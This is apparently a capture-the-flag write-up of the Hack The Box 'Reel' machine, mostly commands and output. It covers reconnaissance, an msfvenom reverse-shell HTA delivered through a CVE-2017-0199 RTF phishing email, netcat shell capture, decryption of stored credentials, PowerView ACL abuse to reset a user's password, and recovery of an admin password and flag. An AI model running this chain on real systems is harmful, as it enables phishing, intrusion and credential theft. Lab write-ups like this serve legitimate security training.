# Nmap:
```bash
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_05-29-18  12:19AM       <DIR>          documents
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp    open  ssh         OpenSSH 7.6 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)
|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)
|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)
25/tcp    open  smtp?
| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe: 
|     220 Mail Service ready
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 Mail Service ready
|     EHLO Invalid domain address.
|   Help: 
|     220 Mail Service ready
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   SIPOptions: 
|     220 Mail Service ready
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|     sequence of commands
|   TerminalServerCookie: 
|     220 Mail Service ready
|_    sequence of commands
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
445/tcp   open  D�4}��B     Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)
593/tcp   open  ncacn_http  Microsoft Windows RPC over HTTP 1.0
49159/tcp open  msrpc       Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.94%I=7%D=7/2%Time=64A0EF7B%P=x86_64-pc-linux-gnu%r(NULL,
SF:18,"220\x20Mail\x20Service\x20ready\r\n")%r(Hello,3A,"220\x20Mail\x20Se
SF:rvice\x20ready\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n")%r
SF:(Help,54,"220\x20Mail\x20Service\x20ready\r\n211\x20DATA\x20HELO\x20EHL
SF:O\x20MAIL\x20NOOP\x20QUIT\x20RCPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")
SF:%r(GenericLines,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20se
SF:quence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\
SF:n")%r(GetRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x20s
SF:equence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n")%r(HTTPOptions,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\x2
SF:0sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands
SF:\r\n")%r(RTSPRequest,54,"220\x20Mail\x20Service\x20ready\r\n503\x20Bad\
SF:x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comman
SF:ds\r\n")%r(RPCCheck,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSVers
SF:ionBindReqTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(DNSStatusRequ
SF:estTCP,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SSLSessionReq,18,"22
SF:0\x20Mail\x20Service\x20ready\r\n")%r(TerminalServerCookie,36,"220\x20M
SF:ail\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n
SF:")%r(TLSSessionReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(Kerberos
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SMBProgNeg,18,"220\x20Mail
SF:\x20Service\x20ready\r\n")%r(X11Probe,18,"220\x20Mail\x20Service\x20rea
SF:dy\r\n")%r(FourOhFourRequest,54,"220\x20Mail\x20Service\x20ready\r\n503
SF:\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x
SF:20commands\r\n")%r(LPDString,18,"220\x20Mail\x20Service\x20ready\r\n")%
SF:r(LDAPSearchReq,18,"220\x20Mail\x20Service\x20ready\r\n")%r(LDAPBindReq
SF:,18,"220\x20Mail\x20Service\x20ready\r\n")%r(SIPOptions,162,"220\x20Mai
SF:l\x20Service\x20ready\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n50
SF:3\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\
SF:x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x
SF:20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20command
SF:s\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence
SF:\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20commands\r\n503\x
SF:20Bad\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20
SF:commands\r\n");
Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2023-07-02T03:33:51
|_  start_date: 2023-07-02T03:19:59
|_clock-skew: mean: -19m59s, deviation: 34m37s, median: 0s
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: REEL
|   NetBIOS computer name: REEL\x00
|   Domain name: HTB.LOCAL
|   Forest name: HTB.LOCAL
|   FQDN: REEL.HTB.LOCAL
|_  System time: 2023-07-02T04:33:49+01:00
| smb2-security-mode: 
|   3:0:2: 
|_    Message signing enabled and required
```

# Logged in on FTP(anonymous):

```bash
└─$ ftp 10.10.10.77
Connected to 10.10.10.77.
ftp> ls
229 Entering Extended Passive Mode (|||41022|)
125 Data connection already open; Transfer starting.
05-29-18  12:19AM                 2047 AppLocker.docx
05-28-18  02:01PM                  124 readme.txt
10-31-17  10:13PM                14581 Windows Event Forwarding.docx
```

# Using exiftool extract data:

```bash
└─$ exiftool Windows\ Event\ Forwarding.docx
ExifTool Version Number         : 12.63
Zip Compressed Size             : 385
Zip Uncompressed Size           : 1422
Zip File Name                   : [Content_Types].xml
Creator                         : nico@megabank.com
Revision Number                 : 4
Create Date                     : 2017:10:31 18:42:00Z
Modify Date                     : 2017:10:31 18:51:00Z
```

# Make sure to what is happening on port 25:

```bash
 telnet 10.10.10.77 25
Trying 10.10.10.77...
Connected to 10.10.10.77.
Escape character is '^]'.
220 Mail Service ready
HELO 0xdf.com
250 Hello.
MAIL FROM: <0xdf@aol.com>
250 OK
RCPT TO: <0xdf@megabank.com>
550 Unknown user
RCPT TO: <nico@megabank.com>
250 OK
RCPT TO: <nico@reel.htb>
250 OK
```

# Generate malicious payload of HTA file:

```bash
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=8888 -f hta-psh -o file1.hta                      
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 7299 bytes
Saved as: file1.hta

```

# Using exploit of rtf file make a file: 

```bash
└─$ python2.7 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.5/file1.hta -t rtf 
Generating normal RTF payload.

Generated invoice.rtf successfully
```

# Make sure to set up server to send file:

```bash
└─$ python -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
# Transfer file using sendmail and start netcat:

```bash
└─$ sendemail -f mail@mail.com -t nico@megabank.com -u 'mail subject' -m 'message body' -a invoice.rtf -s 10.10.10.77 -v 
Jul 03 05:27:15 kali sendemail[113845]: DEBUG => Connecting to 10.10.10.77:25
Jul 03 05:27:15 kali sendemail[113845]: DEBUG => My IP address is: 10.10.14.5
Jul 03 05:27:15 kali sendemail[113845]: SUCCESS => Received:    220 Mail Service ready
Jul 03 05:27:15 kali sendemail[113845]: INFO => Sending:        EHLO kali
Jul 03 05:27:15 kali sendemail[113845]: SUCCESS => Received:    250-REEL, 250-SIZE 20480000, 250-AUTH LOGIN PLAIN, 250 HELP
Jul 03 05:27:15 kali sendemail[113845]: INFO => Sending:        MAIL FROM:<mail@mail.com>
Jul 03 05:27:15 kali sendemail[113845]: SUCCESS => Received:    250 OK
Jul 03 05:27:15 kali sendemail[113845]: INFO => Sending:        RCPT TO:<nico@megabank.com>
Jul 03 05:27:15 kali sendemail[113845]: SUCCESS => Received:    250 OK
Jul 03 05:27:15 kali sendemail[113845]: INFO => Sending:        DATA
Jul 03 05:27:15 kali sendemail[113845]: SUCCESS => Received:    354 OK, send.
Jul 03 05:27:15 kali sendemail[113845]: INFO => Sending message body
Jul 03 05:27:15 kali sendemail[113845]: Setting content-type: text/plain
Jul 03 05:27:15 kali sendemail[113845]: DEBUG => Sending the attachment [invoice.rtf]
Jul 03 05:27:27 kali sendemail[113845]: SUCCESS => Received:    250 Queued (11.592 seconds)
Jul 03 05:27:27 kali sendemail[113845]: Email was sent successfully!  From: <mail@mail.com> To: <nico@megabank.com> Subject: [mail subject] Attachment(s): [invoice.rtf] Server: [10.10.10.77:25]
```


# Got shell:

```bash
└─$ nc -nvlp 8888                         
listening on [any] 8888 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.77] 63369
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
htb\nico

C:\Windows\system32>
```
# Got cred.xml file in desktop:

```bash
C:\Users\nico\Desktop>more cred.xml
more cred.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">HTB\Tom</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692</SS>
    </Props>
  </Obj>
</Objs>
```

# Upon googling get to know about cmds: Reference

```bash
C:\Users\nico\Desktop>powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```

# Login using SSH:

```bash
└─$ ssh tom@10.10.10.77 
```

# Got note on DESKTOP:

```bash
tom@REEL C:\Users\tom\Desktop\AD Audit>more note.txt                                                                            
Findings:                                                                                                                       

Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query).                                  

Maybe we should re-run Cypher query against other groups we've created.    
```

# Got file donwload to kali using scp:

```bash
└─$ scp tom@10.10.10.77:C:/Users/tom/Desktop/"AD Audit"/BloodHound/Ingestors/acls.csv ~/htb/reel 
tom@10.10.10.77's password: 
acls.csv 
```

# opened the file :

![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/a15d3e4e-74ad-45b5-85ea-cc3900b19c66)

# Tom has write acess to claire Chang ethe password:

```bash
 . .\PowerView.ps1 
  Set-DomainObjectOwner -identity claire -OwnerIdentity tom               
   Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
    $cred = ConvertTo-SecureString "Passw0rd!" -AsPlainText -force      
     Set-DomainUserPassword -identity claire -accountpassword $cred        
```
![image](https://github.com/thesinghsec/HackingNotes101/assets/126919241/52e04664-a6a7-4bda-9d87-735b9b4d3c5f)

# Claire has writeDacl permissiions:
     
# SSH to claire and writedacl:

```bash
claire@REEL C:\Users\claire>net group backup_admins /add claire                                                                 
The command completed successfully.                                                                                             


claire@REEL C:\Users\claire>net group backup_admins                                                                             
Group name     Backup_Admins                                                                                                    
Comment                                                                                                                         

Members                                                                                                                         

-------------------------------------------------------------------------------                                                 
claire                   ranj                                                                                                   
The command completed successfully.

```
# Log out an dlogin back to take the effect:

```bash
claire@REEL C:\>cd Users\Administrator\Desktop
dir                                                                                  
 Volume in drive C has no label.                                                                                                
 Volume Serial Number is CEBA-B613                                                                                              

 Directory of C:\Users\Administrator\Desktop                                                                                    

01/21/2018  03:56 PM    <DIR>          .                                                                                        
01/21/2018  03:56 PM    <DIR>          ..                                                                                       
11/02/2017  10:47 PM    <DIR>          Backup Scripts                                                                           
07/02/2023  04:20 AM                34 root.txt                                                                                 
               1 File(s)             34 bytes                                                                                   
               3 Dir(s)   4,909,965,312 bytes free    
```  
 # In backup script found BcackupScript.ps1 file:
 
 `more BackupScript.ps1`                                                 
# admin password                                                                                                                

`$password="Cr4ckMeIfYouC4n!"`                                                                                                    

#Variables, only Change here                                             


# ssh into admin:

```bash
administrator@REEL C:\Users\Administrator\Desktop>more root.txt                                                                 
a4f0231a4d371b007b60eed10d90bcae                                                                                                
```
